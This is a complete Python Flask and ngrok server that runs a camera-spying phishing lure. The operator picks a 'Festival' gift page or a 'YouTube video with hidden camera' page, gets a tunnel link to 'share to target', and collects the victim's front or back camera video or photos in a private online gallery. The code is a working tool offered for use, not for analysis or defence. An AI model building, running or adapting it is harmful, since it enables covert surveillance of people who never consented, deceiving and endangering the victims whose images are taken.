#!/usr/bin/env python3
"""
Gift Video Receiver Server - Ngrok Direct Receiver & Online Media Gallery
"""

import os
import sys
import time
import json
import subprocess
import threading
import urllib.parse
import urllib.request
import re
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from werkzeug.utils import secure_filename

# ============================================
# CONFIGURATION
# ============================================
UPLOAD_FOLDER = Path("gift_videos")
PORT = 5000
FESTIVAL_HTML = 'festival.html'
YOUTUBE_HTML = 'youtube.html'

# Ensure upload directory exists
UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)

# ============================================
# FLASK APPLICATION SETUP
# ============================================
app = Flask(__name__)
CORS(app)

# Allow file uploads up to 5GB
app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024 * 1024

received_files = []

# ============================================
# WEB ROUTES
# ============================================

@app.route('/festival')
def festival_page():
    try:
        with open(FESTIVAL_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {FESTIVAL_HTML} not found!</h1>", 404

@app.route('/youtube')
def youtube_page():
    try:
        with open(YOUTUBE_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404

@app.route('/upload', methods=['POST'])
def upload_media():
    try:
        if 'media' not in request.files:
            return jsonify({'error': 'No media file'}), 400
        
        media_file = request.files['media']
        if media_file.filename == '':
            return jsonify({'error': 'Empty filename'}), 400

        media_type = request.form.get('type', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        default_ext = '.jpg' if media_type == 'photo' else '.webm'
        
        # Secure filename and guarantee proper extension
        safe_name = secure_filename(media_file.filename)
        if not safe_name or safe_name == 'blob':
            safe_name = f"{media_type}_{timestamp}{default_ext}"
        else:
            name, ext_orig = os.path.splitext(safe_name)
            if not ext_orig:
                ext_orig = default_ext
            safe_name = f"{name}_{timestamp}{ext_orig}"
        
        # Save locally
        local_path = UPLOAD_FOLDER / safe_name
        media_file.save(local_path)
        
        # Determine Ngrok URLs for direct online viewing
        base_ngrok = app.config.get('NGROK_URL') or ""
        view_url = f"{base_ngrok}/view/{safe_name}" if base_ngrok else f"/view/{safe_name}"
        download_url = f"{base_ngrok}/download/{safe_name}" if base_ngrok else f"/download/{safe_name}"
        gallery_url = f"{base_ngrok}/gallery" if base_ngrok else "/gallery"
        
        file_info = {
            'filename': safe_name,
            'path': str(local_path.absolute()),
            'type': media_type,
            'timestamp': timestamp,
            'size': local_path.stat().st_size,
            'view_url': view_url,
            'download_url': download_url,
            'gallery_url': gallery_url
        }
        
        received_files.append(file_info)
        
        # Clean, aligned console display output
        print("\n" + "=" * 60)
        print(f"📹 RECEIVED MEDIA #{len(received_files)} ({media_type.upper()})")
        print("=" * 60)
        print(f"  📁 File:              {safe_name}")
        print(f"  📊 Size:              {file_info['size']:,} bytes")
        print(f"  📂 Local Path:        {file_info['path']}")
        print(f"  📺 Direct View Link:  {view_url}")
        print(f"  🖼️ Online Gallery:   {gallery_url}")
        print("=" * 60)
        
        return jsonify({
            'success': True,
            'filename': safe_name,
            'view_url': view_url,
            'download_url': download_url,
            'gallery_url': gallery_url,
            'local_path': file_info.get('path')
        }), 200

    except Exception as e:
        print(f"❌ Upload Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/view/<filename>', methods=['GET'])
def view_media(filename):
    filepath = UPLOAD_FOLDER / filename
    if not filepath.exists():
        return jsonify({'error': 'File not found'}), 404
        
    ext = filename.lower().split('.')[-1]
    mime_types = {
        'webm': 'video/webm',
        'mp4': 'video/mp4',
        'jpg': 'image/jpeg',
        'jpeg': 'image/jpeg',
        'png': 'image/png'
    }
    mimetype = mime_types.get(ext, 'application/octet-stream')
    return send_file(filepath, mimetype=mimetype, as_attachment=False)

@app.route('/gallery', methods=['GET'])
def gallery_page():
    html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captured Media Gallery</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; padding: 20px; min-height: 100vh; }
        header { max-width: 1200px; margin: 0 auto 30px; display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #1e293b; }
        h1 { font-size: 1.8rem; font-weight: 700; background: linear-gradient(135deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .stats { font-size: 0.9rem; color: #94a3b8; background: #1e293b; padding: 6px 14px; border-radius: 20px; border: 1px solid #334155; }
        .grid { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .card { background: #1e293b; border-radius: 12px; overflow: hidden; border: 1px solid #334155; transition: transform 0.2s, box-shadow 0.2s; }
        .card:hover { transform: translateY(-4px); box-shadow: 0 10px 25px -5px rgba(0,0,0,0.5); }
        .media-container { width: 100%; height: 230px; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .media-container video, .media-container img { width: 100%; height: 100%; object-fit: contain; }
        .card-body { padding: 15px; }
        .file-name { font-size: 0.95rem; font-weight: 600; color: #e2e8f0; margin-bottom: 6px; word-break: break-all; }
        .meta { font-size: 0.8rem; color: #94a3b8; display: flex; justify-content: space-between; margin-bottom: 12px; }
        .actions { display: flex; gap: 8px; }
        .btn { flex: 1; text-align: center; padding: 8px 12px; border-radius: 6px; font-size: 0.85rem; font-weight: 500; text-decoration: none; transition: background 0.2s; }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-primary:hover { background: #2563eb; }
        .btn-secondary { background: #334155; color: #cbd5e1; }
        .btn-secondary:hover { background: #475569; }
        .empty { text-align: center; grid-column: 1 / -1; padding: 60px; color: #64748b; font-size: 1.1rem; }
    </style>
</head>
<body>
    <header>
        <h1>📹 Captured Media Gallery</h1>
        <div class="stats" id="counter">Auto-Refresh Active (5s)</div>
    </header>
    <div class="grid" id="galleryGrid"></div>
    <script>
        async function loadGallery() {
            try {
                const res = await fetch('/files');
                const data = await res.json();
                const files = data.files || [];
                const grid = document.getElementById('galleryGrid');
                document.getElementById('counter').textContent = `${files.length} Item(s) Received`;
                
                if (files.length === 0) {
                    grid.innerHTML = '<div class="empty">⏳ No photos or videos received yet.<br>Captured media will automatically appear here live!</div>';
                    return;
                }
                
                grid.innerHTML = files.slice().reverse().map(f => {
                    const isVideo = f.type === 'video' || f.filename.endsWith('.webm') || f.filename.endsWith('.mp4');
                    const viewUrl = `/view/${f.filename}`;
                    const downloadUrl = `/download/${f.filename}`;
                    
                    const mediaHtml = isVideo 
                        ? `<video controls src="${viewUrl}" preload="metadata"></video>`
                        : `<img src="${viewUrl}" alt="${f.filename}" loading="lazy">`;
                        
                    return `
                        <div class="card">
                            <div class="media-container">${mediaHtml}</div>
                            <div class="card-body">
                                <div class="file-name">${f.filename}</div>
                                <div class="meta">
                                    <span>TYPE: ${f.type.toUpperCase()}</span>
                                    <span>${(f.size / 1024).toFixed(1)} KB</span>
                                </div>
                                <div class="actions">
                                    <a class="btn btn-primary" href="${viewUrl}" target="_blank">🔍 Direct View</a>
                                    <a class="btn btn-secondary" href="${downloadUrl}">📥 Download</a>
                                </div>
                            </div>
                        </div>
                    `;
                }).join('');
            } catch(e) {
                console.error("Failed loading gallery", e);
            }
        }
        loadGallery();
        setInterval(loadGallery, 5000);
    </script>
</body>
</html>"""
    return html_content

@app.route('/files', methods=['GET'])
def list_files():
    return jsonify({
        'files': received_files
    })

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    filepath = UPLOAD_FOLDER / filename
    if filepath.exists():
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ============================================
# MAIN SERVER CLASS
# ============================================
class GiftServer:
    def __init__(self):
        self.ngrok_process = None
        self.ngrok_url = None
        self.port = PORT
        self.running = True
        self.ngrok_ready = threading.Event()

    def check_html_files(self):
        if not os.path.exists(FESTIVAL_HTML):
            print(f"\n❌ Error: {FESTIVAL_HTML} not found!")
            return False
        if not os.path.exists(YOUTUBE_HTML):
            print(f"\n❌ Error: {YOUTUBE_HTML} not found!")
            return False
        return True

    def get_camera_type(self):
        print("\n📷 Select camera type:")
        print("  1. Front Camera")
        print("  2. Back Camera")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'user'
            elif choice == '2':
                return 'environment'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_capture_mode(self):
        print("\n📸 Select capture mode:")
        print("  1. Video - Record 15 second video")
        print("  2. Photo - Capture 5 photos")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'video', 15, 0
            elif choice == '2':
                return 'photo', 0, 5
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def show_main_menu(self):
        print("\n" + "=" * 60)
        print("🎁 GIFT VIDEO RECEIVER (NGROK DIRECT SERVER)")
        print("=" * 60)
        print("\nSelect mode:")
        print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
        print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
        print("\n" + "-" * 60)
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'festival'
            elif choice == '2':
                return 'youtube'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_festival_name(self):
        name = input("\n📝 Enter festival/gift name: ").strip()
        if not name:
            name = "Surprise"
            print(f"   Using default: {name}")
        return name

    def get_youtube_video(self):
        print("\n🎬 Enter YouTube video URL or ID:")
        print("   (Press Enter for default video)")
        video = input("   ▶ ").strip()
        
        if video and ('youtube.com' in video or 'youtu.be' in video):
            patterns = [
                r'(?:youtube\.com\/watch\?v=)([^&]+)',
                r'(?:youtu\.be\/)([^?]+)',
                r'(?:youtube\.com\/embed\/)([^?]+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, video)
                if match:
                    video = match.group(1)
                    break
        
        if not video:
            video = "dQw4w9WgXcQ"
            print(f"   Using default video ID: {video}")
        else:
            print(f"   Using video ID: {video}")
        
        return video

    def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
        base_url = self.ngrok_url
        
        if mode == 'festival':
            link = f"{base_url}/festival?name={urllib.parse.quote(name)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎊 Festival Mode"
        else:
            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎬 YouTube Mode"
        
        return link, mode_name

    def check_ngrok(self):
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except FileNotFoundError:
            pass
        
        print("\n❌ ngrok is not installed or not in PATH!")
        print("📥 Install from: https://ngrok.com/download")
        return False

    def apply_ngrok_authtoken(self, token):
        try:
            result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], capture_output=True, text=True)
            if result.returncode == 0:
                print("   ✅ Ngrok authtoken configured successfully!")
                return True
            else:
                result2 = subprocess.run(['ngrok', 'authtoken', token], capture_output=True, text=True)
                if result2.returncode == 0:
                    print("   ✅ Ngrok authtoken configured successfully!")
                    return True
                else:
                    err = result.stderr.strip() or result2.stderr.strip()
                    print(f"   ⚠️ Warning: {err}")
                    return False
        except Exception as e:
            print(f"   ⚠️ Could not set ngrok authtoken: {e}")
            return False

    def setup_ngrok_authtoken(self):
        token = os.getenv("NGROK_AUTHTOKEN")
        token_file = Path(".ngrok_token")
        choice = ""

        if not token and token_file.exists():
            token = token_file.read_text().strip()

        print("\n🔑 NGROK AUTHENTICATION SETUP:")
        if token:
            masked = f"{token[:6]}...{token[-4:]}" if len(token) > 10 else "***"
            print(f"   Found saved authtoken: {masked}")
            choice = input("   Use saved authtoken? (Y/n, or paste new token): ").strip()
            if choice.lower() in ['', 'y', 'yes']:
                return self.apply_ngrok_authtoken(token)
            elif choice.lower() not in ['n', 'no'] and len(choice) > 10:
                token = choice
            elif choice.lower() in ['n', 'no']:
                token = ""

        if not token:
            print("   Get your free authtoken from: https://dashboard.ngrok.com/get-started/your-authtoken")
            token = input("   Enter your ngrok Authtoken (press Enter to skip): ").strip()

        if token:
            token_file.write_text(token)
            return self.apply_ngrok_authtoken(token)
        else:
            print("   ⚠️ Skipping authtoken setup (using existing CLI configuration).")
            return True

    def monitor_ngrok(self):
        try:
            time.sleep(3)
            for attempt in range(10):
                try:
                    with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
                        data = json.loads(response.read().decode())
                        for tunnel in data.get('tunnels', []):
                            if tunnel.get('proto') == 'https':
                                self.ngrok_url = tunnel.get('public_url')
                                self.ngrok_ready.set()
                                return
                except Exception:
                    time.sleep(3)
        except Exception as e:
            print(f"❌ Error monitoring ngrok: {e}")

    def start_ngrok(self):
        print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
        
        try:
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            
            monitor_thread = threading.Thread(target=self.monitor_ngrok)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            if self.ngrok_ready.wait(timeout=30):
                print(f"✅ Tunnel established!")
                return True
            else:
                print("⚠️ ngrok started but URL not found")
                return False
                
        except Exception as e:
            print(f"❌ Failed to start ngrok: {e}")
            return False

    def start_flask(self):
        print(f"\n🔧 Starting server on port {self.port}...")
        
        def run_flask():
            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Server running")

    def wait_for_files(self):
        print("\n🎁 Server ready! Waiting for incoming files... (Press Ctrl+C to stop)")
        print(f"📁 Local Folder:   {UPLOAD_FOLDER.absolute()}")
        print(f"🖼️ Ngrok Gallery: {self.ngrok_url}/gallery")
        print("=" * 60)
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n👋 Shutting down...")

    def cleanup(self):
        print("\n🧹 Cleaning up...")
        if self.ngrok_process:
            self.ngrok_process.terminate()
            try:
                self.ngrok_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.ngrok_process.kill()
        print("✅ Done!")

    def run(self):
        try:
            # Setup
            if not self.check_html_files():
                return
            
            if not self.check_ngrok():
                return

            # Ngrok Authtoken Setup
            self.setup_ngrok_authtoken()
            
            # Main menu
            mode = self.show_main_menu()
            camera = self.get_camera_type()
            capture_mode, duration, photos = self.get_capture_mode()
            
            if mode == 'festival':
                name = self.get_festival_name()
                video_id = None
            else:
                video_id = self.get_youtube_video()
                name = None
            
            # Start server
            self.start_flask()
            if not self.start_ngrok():
                return
            
            app.config['NGROK_URL'] = self.ngrok_url

            # Generate link
            link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
            gallery_link = f"{self.ngrok_url}/gallery"
            
            print("\n" + "=" * 60)
            print(f"📤 SHARE THIS LINK TO TARGET ({mode_name}):")
            print("=" * 60)
            print(f"\n🔗 {link}\n")
            print("=" * 60)
            
            print("\n" + "=" * 60)
            print("🖼️ YOUR PRIVATE ONLINE GALLERY (VIEW RECEIVED MEDIA):")
            print("=" * 60)
            print(f"\n🔗 {gallery_link}\n")
            print("=" * 60)
            
            print("\n📋 Configuration Summary:")
            print(f"   🎯 Mode:         {mode_name}")
            print(f"   📷 Camera:       {'Front' if camera == 'user' else 'Back'}")
            print(f"   📸 Capture:      {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
            print(f"   🌐 Server Mode:  Direct Ngrok Server Only")
            if mode == 'festival':
                print(f"   🎊 Festival:     {name}")
            else:
                print(f"   🎬 Video ID:     {video_id}")
            
            self.wait_for_files()
            
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
        finally:
            self.cleanup()

if __name__ == '__main__':
    server = GiftServer()
    server.run()